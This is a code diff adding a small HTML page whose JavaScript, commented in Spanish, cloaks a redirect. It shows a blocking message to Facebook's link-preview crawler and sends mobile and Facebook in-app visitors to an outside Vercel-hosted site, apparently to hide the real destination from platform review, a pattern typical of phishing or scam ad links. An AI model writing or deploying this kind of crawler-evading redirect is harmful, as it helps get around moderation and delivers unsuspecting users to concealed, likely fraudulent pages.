@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="robots" content="noindex, nofollow">
+ 
+    <script>
+        // Función para detectar si la solicitud proviene de un dispositivo Apple o Android
+        function esDispositivoPermitido(userAgent) {
+            return /iPad|iPhone|iPod/.test(userAgent) || /Android/.test(userAgent);
+        }
+
+        // Función para detectar si la solicitud proviene del bot de Facebook
+        function esBotDeFacebook(userAgent) {
+            return userAgent.indexOf('facebookexternalhit') !== -1;
+        }
+
+        // Función para redirigir si es un usuario humano
+        function redirigirSiHumano() {
+            // Verificar si el agente de usuario contiene cadenas comunes de Facebook
+            if (/FBAN|FBAV|FB_IAB/.test(navigator.userAgent)) {
+                // Redirigir al URL deseado si el usuario parece estar navegando desde Facebook
+                window.location.replace("https://reikpanel.vercel.app");
+            } else {
+                // Si no se cumple ninguna condición, se muestra un mensaje
+                mostrarMensajeAccesoRestringido();
+            }
+        }
+
+        // Función para mostrar un mensaje de acceso restringido
+        function mostrarMensajeAccesoRestringido() {
+            document.body.innerHTML = "<h1>Acceso restringido. Solo se permite acceso desde Facebook.</h1>";
+        }
+
+        // Función principal para realizar la redirección o mostrar un mensaje
+        function redireccionar() {
+            var userAgent = navigator.userAgent || navigator.vendor || window.opera;
+            
+            if (esBotDeFacebook(userAgent)) {
+                // Mostrar un mensaje de bloqueo para los bots de Facebook
+                document.body.innerHTML = "<h1>Acceso restringido para los bots de Facebook</h1>";
+            } else if (esDispositivoPermitido(userAgent)) {
+                // Redireccionar a la URL deseada después de un breve retraso si es un dispositivo permitido
+                setTimeout(function() {
+                    location.href = "https://reikpanel.vercel.app";
+                }, 2000); // Esperar 2 segundos antes de redirigir
+            } else {
+                // Llamar a la función de redirección para la IA si no es un dispositivo permitido
+                redirigirSiHumano();
+            }
+        }
+
+        // Llamar a la función principal al cargar la página
+        window.onload = redireccionar;
+    </script>
+</head>
+<body>
+    <p>Redireccionando a la página deseada...</p>
+</body>
+</html>
